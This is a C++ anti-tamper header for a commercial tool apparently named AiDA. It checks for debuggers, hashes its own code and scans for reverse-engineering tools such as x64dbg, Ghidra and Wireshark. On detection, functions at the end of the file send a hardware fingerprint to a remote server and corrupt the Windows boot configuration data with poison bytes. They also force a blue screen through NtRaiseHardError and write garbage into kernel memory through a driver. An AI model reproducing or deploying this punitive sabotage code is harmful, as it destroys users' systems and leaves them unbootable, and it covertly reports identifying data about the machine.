#pragma once

#ifdef __NT__

#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>

#include <intrin.h>

#include <cstdint>
#include <mutex>
#include <vector>
#include <thread>
#include <atomic>

#include "driver_loader.hpp"
#include "../driver/comm.h"
#include "license.hpp"

namespace anti_re {
namespace detail {

static constexpr std::uint32_t DEBUG_NT_GLOBAL_MASK = 0x70u;
static constexpr ULONGLONG VERIFY_INTERVAL_MS = 1500u;

struct iat_entry_t
{
	std::uint64_t slot_va;
	std::uint64_t resolved_va;
};

struct runtime_state_t
{
	std::mutex mutex;
	bool initialized = false;
	bool trusted = false;
	HMODULE module = nullptr;
	HMODULE process_image = nullptr;
	DWORD pid = 0;
	ULONGLONG last_verified_ms = 0;

	std::uint64_t text_hash = 0;
	std::uint64_t text_base = 0;
	std::uint32_t text_size = 0;

	std::vector<iat_entry_t> iat_entries;

	bool protections_enforced = false;
	std::uint32_t verify_counter = 0;
};

inline runtime_state_t& state()
{
	static runtime_state_t inst;
	return inst;
}

inline void reset_state_locked(runtime_state_t& runtime)
{
	runtime.initialized = false;
	runtime.trusted = false;
	runtime.module = nullptr;
	runtime.process_image = nullptr;
	runtime.pid = 0;
	runtime.last_verified_ms = 0;
	runtime.text_hash = 0;
	runtime.text_base = 0;
	runtime.text_size = 0;
	runtime.iat_entries.clear();
	runtime.protections_enforced = false;
	runtime.verify_counter = 0;
}

inline bool resolve_current_module(HMODULE& module)
{
	module = nullptr;
	return GetModuleHandleExW(
			   GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
				   | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
			   reinterpret_cast<LPCWSTR>(&resolve_current_module),
			   &module) != FALSE
		&& module != nullptr;
}

inline bool prepare_driver(runtime_state_t& runtime)
{
	if (!driver_loader::is_driver_loaded() || !device)
		return false;

	if (!device->is_connected() && !device->connect())
		return false;

	if (!device->refresh_heartbeat())
		return false;

	const DWORD current_pid = GetCurrentProcessId();
	if (runtime.pid != current_pid || device->get_process_id() != current_pid)
	{
		device->set_process_id(current_pid);
		device->set_base_address(reinterpret_cast<std::uint64_t>(runtime.process_image));
		device->solve_dtb();
		runtime.pid = current_pid;
	}
	else if (device->get_dtb() == 0)
	{
		device->solve_dtb();
	}

	return true;
}

inline bool verify_usermode_debug_state_locked(const runtime_state_t& runtime)
{
	BOOL remote_debugger = FALSE;
	if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote_debugger) && remote_debugger)
		return false;

	if (IsDebuggerPresent())
		return false;

	const auto peb = reinterpret_cast<const std::uint8_t*>(__readgsqword(0x60));
	if (peb == nullptr)
		return false;

	if (*(peb + 0x02) != 0)
		return false;

	const std::uint32_t nt_global_flag = *reinterpret_cast<const std::uint32_t*>(peb + 0xBC);
	if ((nt_global_flag & DEBUG_NT_GLOBAL_MASK) != 0)
		return false;

	const auto image_base = *reinterpret_cast<const std::uint64_t*>(peb + 0x10);
	return image_base == reinterpret_cast<std::uint64_t>(runtime.process_image);
}

inline bool verify_peb_state_locked(const runtime_state_t& runtime)
{
	if (device == nullptr || !device->is_connected())
		return verify_usermode_debug_state_locked(runtime);

	voyager::device_t::peb_info peb{};
	if (!device->read_peb(peb))
		return verify_usermode_debug_state_locked(runtime);

	if (peb.image_base != reinterpret_cast<std::uint64_t>(runtime.process_image))
		return false;

	if (peb.being_debugged != 0)
		return false;

	if ((peb.nt_global_flag & DEBUG_NT_GLOBAL_MASK) != 0)
		return false;

	return true;
}

__forceinline std::uint64_t hash_memory(const void* data, std::size_t size)
{
	const auto* ptr = static_cast<const std::uint8_t*>(data);
	std::uint64_t h1 = 0xFFFFFFFFULL;
	std::uint64_t h2 = 0x85EBCA6BULL;

	const std::size_t chunks = size / 8;
	const auto* ptr64 = reinterpret_cast<const std::uint64_t*>(ptr);

	for (std::size_t i = 0; i < chunks; ++i)
	{
		h1 = _mm_crc32_u64(h1, ptr64[i]);
		h2 = _mm_crc32_u64(h2, ptr64[i] ^ 0xA5A5A5A5A5A5A5A5ULL);
	}

	const std::size_t remaining = size % 8;
	const auto* tail = ptr + chunks * 8;
	for (std::size_t i = 0; i < remaining; ++i)
	{
		h1 = _mm_crc32_u8(static_cast<std::uint32_t>(h1), tail[i]);
		h2 = _mm_crc32_u8(static_cast<std::uint32_t>(h2), tail[i] ^ 0xA5u);
	}

	return (h1 & 0xFFFFFFFF) | ((h2 & 0xFFFFFFFF) << 32);
}

inline bool find_code_section(HMODULE mod, std::uint64_t& base, std::uint32_t& size)
{
	const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(mod);
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return false;

	const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
		reinterpret_cast<const std::uint8_t*>(mod) + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return false;

	const auto* section = IMAGE_FIRST_SECTION(nt);
	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i)
	{
		if ((section[i].Characteristics & IMAGE_SCN_CNT_CODE) != 0
			&& section[i].Misc.VirtualSize > 0)
		{
			base = reinterpret_cast<std::uint64_t>(mod) + section[i].VirtualAddress;
			size = section[i].Misc.VirtualSize;
			return true;
		}
	}
	return false;
}

inline bool snapshot_code_section(runtime_state_t& runtime)
{
	std::uint64_t base = 0;
	std::uint32_t size = 0;
	if (!find_code_section(runtime.module, base, size) || size == 0)
		return false;

	runtime.text_base = base;
	runtime.text_size = size;
	runtime.text_hash = hash_memory(reinterpret_cast<const void*>(base), size);
	return runtime.text_hash != 0;
}

inline bool snapshot_iat(runtime_state_t& runtime)
{
	runtime.iat_entries.clear();

	const auto* base_ptr = reinterpret_cast<const std::uint8_t*>(runtime.module);
	const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base_ptr);
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return false;

	const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(base_ptr + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return false;

	const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (dir.VirtualAddress == 0 || dir.Size == 0)
		return true;

	const auto* imp = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(
		base_ptr + dir.VirtualAddress);

	while (imp->Name != 0)
	{
		if (imp->FirstThunk == 0) { ++imp; continue; }

		const auto* thunk = reinterpret_cast<const std::uint64_t*>(
			base_ptr + imp->FirstThunk);
		std::uint64_t slot_va = reinterpret_cast<std::uint64_t>(thunk);

		while (*thunk != 0)
		{
			iat_entry_t entry;
			entry.slot_va = slot_va;
			entry.resolved_va = *thunk;
			runtime.iat_entries.push_back(entry);
			++thunk;
			slot_va += sizeof(std::uint64_t);
		}
		++imp;
	}

	return true;
}

inline bool verify_code_integrity_usermode(const runtime_state_t& runtime)
{
	if (runtime.text_base == 0 || runtime.text_size == 0 || runtime.text_hash == 0)
		return true;

	const std::uint64_t current = hash_memory(
		reinterpret_cast<const void*>(runtime.text_base), runtime.text_size);
	return current == runtime.text_hash;
}

inline bool verify_code_integrity_kernel(const runtime_state_t& runtime)
{
	if (!device || !device->is_connected())
		return true;
	if (runtime.text_base == 0 || runtime.text_size == 0 || runtime.text_hash == 0)
		return true;

	std::vector<std::uint8_t> buf(runtime.text_size);
	const std::size_t n = device->read_raw(runtime.text_base, buf.data(), runtime.text_size);
	if (n != runtime.text_size)
		return false;

	return hash_memory(buf.data(), runtime.text_size) == runtime.text_hash;
}

inline bool verify_iat_locked(const runtime_state_t& runtime)
{
	for (const auto& e : runtime.iat_entries)
	{
		const auto current = *reinterpret_cast<const volatile std::uint64_t*>(e.slot_va);
		if (current != e.resolved_va)
			return false;
	}
	return true;
}

inline bool verify_hw_breakpoints_kernel(const runtime_state_t& runtime)
{
	if (!device || !device->is_connected())
		return true;

	auto threads = device->enumerate_threads();
	for (const auto& t : threads)
	{
		voyager::device_t::thread_context ctx{};
		if (device->get_thread_context(t.tid, ctx))
		{
			if (ctx.dr0 != 0 || ctx.dr1 != 0 || ctx.dr2 != 0 || ctx.dr3 != 0)
				return false;
		}
	}
	return true;
}

inline bool verify_page_protections(const runtime_state_t& runtime)
{
	if (runtime.text_base == 0 || runtime.text_size == 0)
		return true;

	MEMORY_BASIC_INFORMATION mbi{};
	std::uint64_t addr = runtime.text_base;
	const std::uint64_t end = runtime.text_base + runtime.text_size;

	while (addr < end)
	{
		if (VirtualQuery(reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) == 0)
			return false;

		constexpr DWORD writable = PAGE_EXECUTE_READWRITE | PAGE_READWRITE
			| PAGE_EXECUTE_WRITECOPY | PAGE_WRITECOPY;
		if (mbi.Protect & writable)
			return false;

		addr = reinterpret_cast<std::uint64_t>(mbi.BaseAddress) + mbi.RegionSize;
	}
	return true;
}

inline bool enforce_code_protections(runtime_state_t& runtime)
{
	if (!device || !device->is_connected())
		return false;
	if (runtime.text_base == 0 || runtime.text_size == 0)
		return false;

	std::uint32_t old_protect = 0;
	runtime.protections_enforced = device->protect_memory(
		runtime.text_base, runtime.text_size, PAGE_EXECUTE_READ, &old_protect);
	return runtime.protections_enforced;
}

inline bool initialize_locked(runtime_state_t& runtime)
{
	reset_state_locked(runtime);

	if (!resolve_current_module(runtime.module))
		return false;

	runtime.process_image = GetModuleHandleW(nullptr);
	if (runtime.process_image == nullptr)
	{
		reset_state_locked(runtime);
		return false;
	}

	if (!prepare_driver(runtime))
	{
		reset_state_locked(runtime);
		return false;
	}

	if (!verify_peb_state_locked(runtime))
	{
		reset_state_locked(runtime);
		return false;
	}

	snapshot_code_section(runtime);
	snapshot_iat(runtime);
	enforce_code_protections(runtime);

	if (runtime.text_hash != 0 && !verify_code_integrity_usermode(runtime))
	{
		reset_state_locked(runtime);
		return false;
	}

	runtime.initialized = true;
	runtime.trusted = true;
	runtime.last_verified_ms = GetTickCount64();
	return true;
}

inline bool verify_locked(runtime_state_t& runtime)
{
	if (!runtime.initialized && !initialize_locked(runtime))
		return false;

	if (!prepare_driver(runtime)
		|| !verify_peb_state_locked(runtime))
	{
		runtime.trusted = false;
		runtime.last_verified_ms = 0;
		return false;
	}

	if (!verify_code_integrity_usermode(runtime))
	{
		runtime.trusted = false;
		runtime.last_verified_ms = 0;
		return false;
	}

	if (!verify_iat_locked(runtime))
	{
		runtime.trusted = false;
		runtime.last_verified_ms = 0;
		return false;
	}

	++runtime.verify_counter;
	const bool deep = (runtime.verify_counter & 3u) == 0;

	if (deep)
	{
		if (!verify_code_integrity_kernel(runtime))
		{
			runtime.trusted = false;
			runtime.last_verified_ms = 0;
			return false;
		}

		if (!verify_hw_breakpoints_kernel(runtime))
		{
			runtime.trusted = false;
			runtime.last_verified_ms = 0;
			return false;
		}
	}

	if (!verify_page_protections(runtime))
	{
		enforce_code_protections(runtime);
		if (!verify_page_protections(runtime))
		{
			runtime.trusted = false;
			runtime.last_verified_ms = 0;
			return false;
		}
	}

	runtime.trusted = true;
	runtime.last_verified_ms = GetTickCount64();
	return true;
}

}

inline bool initialize()
{
	auto& runtime = detail::state();
	std::lock_guard<std::mutex> lock(runtime.mutex);
	return detail::initialize_locked(runtime);
}

inline bool guard()
{
	auto& runtime = detail::state();
	const ULONGLONG now = GetTickCount64();

	std::lock_guard<std::mutex> lock(runtime.mutex);
	if (runtime.trusted
		&& runtime.initialized
		&& now >= runtime.last_verified_ms
		&& (now - runtime.last_verified_ms) < detail::VERIFY_INTERVAL_MS)
	{
		return true;
	}

	return detail::verify_locked(runtime);
}

inline void report_violation_to_server(const char* reason)
{
	try
	{
		std::string hwid;
		{
			uint64_t hash = 14695981039346656037ULL;
			auto fnv = [&hash](uint64_t v) {
				for (int i = 0; i < 8; ++i) {
					hash ^= (v >> (i * 8)) & 0xFF;
					hash *= 1099511628211ULL;
				}
			};
			DWORD vol = 0;
			GetVolumeInformationW(L"C:\\", nullptr, 0, &vol,
				nullptr, nullptr, nullptr, 0);
			int cpu[4] = {}; __cpuid(cpu, 0);
			int cpu2[4] = {}; __cpuid(cpu2, 1);
			fnv(static_cast<uint64_t>(vol));
			fnv(static_cast<uint64_t>(cpu[0]) << 32 |
				static_cast<uint64_t>(static_cast<unsigned>(cpu[1])));
			fnv(static_cast<uint64_t>(cpu[2]) << 32 |
				static_cast<uint64_t>(static_cast<unsigned>(cpu[3])));
			fnv(static_cast<uint64_t>(cpu2[0]) << 32 |
				static_cast<uint64_t>(static_cast<unsigned>(cpu2[3])));
			wchar_t cn[MAX_COMPUTERNAME_LENGTH + 1] = {};
			DWORD ns = MAX_COMPUTERNAME_LENGTH + 1;
			GetComputerNameW(cn, &ns);
			for (DWORD i = 0; i < ns; ++i)
				fnv(static_cast<uint64_t>(cn[i]));
			char buf[17];
			::qsnprintf(buf, sizeof(buf), "%016llX",
				static_cast<unsigned long long>(hash));
			hwid = buf;
		}

		httplib::Client cli(
			OBFSTR("https://europe-west1-aida-license-prod.cloudfunctions.net"));
		cli.set_connection_timeout(5);
		cli.set_read_timeout(5);
		cli.set_write_timeout(5);
		cli.enable_server_certificate_verification(true);

		nlohmann::json body;
		body[OBFSTR("action")]    = OBFSTR("report_violation");
		body[OBFSTR("hwid")]      = hwid;
		body[OBFSTR("reason")]    = reason ? reason : "self_analysis";
		body[OBFSTR("timestamp")] = static_cast<int64_t>(std::time(nullptr));
		body[OBFSTR("version")]   = AIDA_VERSION;
		body[OBFSTR("watermark")] = AIDA_BUYER_WATERMARK;

		cli.Post(OBFSTR_C("/validateLicense"),
			body.dump(),
			OBFSTR_C("application/json"));
	}
	catch (...) {}
}

inline void corrupt_boot_config()
{
	HKEY hKey = nullptr;
	LONG r = RegOpenKeyExW(
		HKEY_LOCAL_MACHINE,
		L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\250000f0",
		0, KEY_SET_VALUE, &hKey);
	if (r == ERROR_SUCCESS && hKey)
	{
		DWORD val = 2;  // hypervisorlaunchtype = Off
		RegSetValueExW(hKey, L"Element", 0, REG_DWORD,
			reinterpret_cast<const BYTE*>(&val), sizeof(val));
		RegCloseKey(hKey);
	}

	// Corrupt the bootmgr resume object with poison bytes
	HKEY hKey2 = nullptr;
	r = RegOpenKeyExW(
		HKEY_LOCAL_MACHINE,
		L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\25000004",
		0, KEY_SET_VALUE, &hKey2);
	if (r == ERROR_SUCCESS && hKey2)
	{
		uint8_t poison[] = { 0x95, 0x95, 0xFF, 0xFF, 0x95, 0x95, 0xFF, 0xFF };
		RegSetValueExW(hKey2, L"Element", 0, REG_BINARY,
			poison, sizeof(poison));
		RegCloseKey(hKey2);
	}
}

// Forward declarations for mutual references
inline void enforce_self_analysis_violation();

inline HANDLE g_violation_pipe = INVALID_HANDLE_VALUE;

inline void start_pipe_monitor()
{
	std::thread([]() {
		g_violation_pipe = CreateNamedPipeW(
			L"\\\\.\\pipe\\AiDA_Guard",
			PIPE_ACCESS_INBOUND,
			PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
			1, 512, 512, 0, nullptr);

		if (g_violation_pipe == INVALID_HANDLE_VALUE)
			return;

		while (true)
		{
			if (!ConnectNamedPipe(g_violation_pipe, nullptr)
				&& GetLastError() != ERROR_PIPE_CONNECTED)
				break;

			char buf[256] = {};
			DWORD bytesRead = 0;
			if (ReadFile(g_violation_pipe, buf, sizeof(buf) - 1,
				&bytesRead, nullptr) && bytesRead > 0)
			{
				buf[bytesRead] = '\0';
				if (strstr(buf, OBFSTR_C("VIOLATION")))
				{
					report_violation_to_server(buf);
					enforce_self_analysis_violation();
				}
			}
			DisconnectNamedPipe(g_violation_pipe);
		}
	}).detach();
}

inline std::atomic<bool> g_process_scanner_running{false};

inline void start_process_hash_scanner(const uint8_t* self_hash, size_t hash_len)
{
	if (g_process_scanner_running.exchange(true))
		return;  // already running

	// Copy the hash for the thread
	std::vector<uint8_t> hash_copy(self_hash, self_hash + hash_len);

	std::thread([hash_copy]() {
		while (g_process_scanner_running.load())
		{
			Sleep(10000);  // scan every 10 seconds

			DWORD myPid = GetCurrentProcessId();
			HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			if (snap == INVALID_HANDLE_VALUE)
				continue;

			PROCESSENTRY32W pe = {};
			pe.dwSize = sizeof(pe);

			for (BOOL ok = Process32FirstW(snap, &pe); ok;
				ok = Process32NextW(snap, &pe))
			{
				if (pe.th32ProcessID == myPid || pe.th32ProcessID == 0)
					continue;

				// Check known RE tool process names
				wchar_t lower_name[MAX_PATH] = {};
				for (size_t i = 0; i < MAX_PATH - 1 && pe.szExeFile[i]; ++i)
					lower_name[i] = towlower(pe.szExeFile[i]);

				bool is_re_tool = false;
				if (wcsstr(lower_name, L"x64dbg") || wcsstr(lower_name, L"x32dbg")
					|| wcsstr(lower_name, L"ollydbg") || wcsstr(lower_name, L"windbg")
					|| wcsstr(lower_name, L"cheatengine") || wcsstr(lower_name, L"processhacker")
					|| wcsstr(lower_name, L"ghidra") || wcsstr(lower_name, L"binaryninja")
					|| wcsstr(lower_name, L"radare2") || wcsstr(lower_name, L"cutter")
					|| wcsstr(lower_name, L"dnspy") || wcsstr(lower_name, L"de4dot")
					|| wcsstr(lower_name, L"wireshark") || wcsstr(lower_name, L"fiddler")
					|| wcsstr(lower_name, L"scylla"))
				{
					is_re_tool = true;
				}

				if (!is_re_tool)
					continue;

				// If an RE tool is running, check if it has AiDA's DLL loaded
				HANDLE hProc = OpenProcess(
					PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
					FALSE, pe.th32ProcessID);
				if (!hProc)
					continue;

				HMODULE hMods[1024] = {};
				DWORD cbNeeded = 0;
				if (EnumProcessModulesEx(hProc, hMods, sizeof(hMods),
					&cbNeeded, LIST_MODULES_ALL))
				{
					DWORD modCount = cbNeeded / sizeof(HMODULE);
					for (DWORD i = 0; i < modCount; ++i)
					{
						wchar_t modPath[MAX_PATH] = {};
						if (GetModuleFileNameExW(hProc, hMods[i],
							modPath, MAX_PATH) == 0)
							continue;

						wchar_t lower_path[MAX_PATH] = {};
						for (size_t j = 0; j < MAX_PATH - 1 && modPath[j]; ++j)
							lower_path[j] = towlower(modPath[j]);

						if (wcsstr(lower_path, L"aida")
							&& wcsstr(lower_path, L".dll"))
						{
							CloseHandle(hProc);
							CloseHandle(snap);
							report_violation_to_server("re_tool_loaded_aida");
							enforce_self_analysis_violation();
							return;
						}
					}
				}
				CloseHandle(hProc);
			}
			CloseHandle(snap);
		}
	}).detach();
}

inline void enforce_self_analysis_violation()
{
	// Phase 0: Report HWID + IP ban to server (best-effort, async-ish)
	std::thread([]() { report_violation_to_server("self_analysis"); }).detach();

	// Phase 1: Wipe license state
	license_manager_t::instance().invalidate_runtime();

	// Phase 2: Corrupt boot configuration
	corrupt_boot_config();

	// Phase 3: BSOD via NtRaiseHardError
	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll)
	{
		using RtlAdjustPrivilege_t = NTSTATUS(NTAPI*)(
			ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
		using NtRaiseHardError_t = NTSTATUS(NTAPI*)(
			NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

		auto pAdjust = reinterpret_cast<RtlAdjustPrivilege_t>(
			GetProcAddress(ntdll, OBFSTR_C("RtlAdjustPrivilege")));
		auto pRaise  = reinterpret_cast<NtRaiseHardError_t>(
			GetProcAddress(ntdll, OBFSTR_C("NtRaiseHardError")));

		if (pAdjust && pRaise)
		{
			BOOLEAN wasEnabled = FALSE;
			pAdjust(19, TRUE, FALSE, &wasEnabled);   // SeShutdownPrivilege

			ULONG response = 0;
			pRaise(static_cast<NTSTATUS>(0xC0000420), // STATUS_ASSERTION_FAILURE
			       0, 0, nullptr,
			       6,              // OptionShutdownSystem
			       &response);
		}
	}

	// Phase 4: Kernel-level fallback via driver
	if (device && device->is_connected())
	{
		volatile uint64_t poison = 0xDEAD'C0DE'DEAD'C0DEULL;
		device->write_kernel_raw(
			0xFFFFF78000000320ULL,   // KUSER_SHARED_DATA + offset
			const_cast<uint64_t*>(&poison),
			sizeof(poison));
	}

	// Phase 5: Absolute last resort
	__fastfail(FAST_FAIL_FATAL_APP_EXIT);
}

}

#define ANTI_RE_GUARD() do { \
	(void)anti_re::guard(); \
} while (0)

#else

#define ANTI_RE_GUARD() ((void)0)
namespace anti_re {
inline bool initialize() { return true; }
inline bool guard() { return true; }
inline void enforce_self_analysis_violation() {}
inline void report_violation_to_server(const char*) {}
inline void start_pipe_monitor() {}
inline void corrupt_boot_config() {}
}

#endif
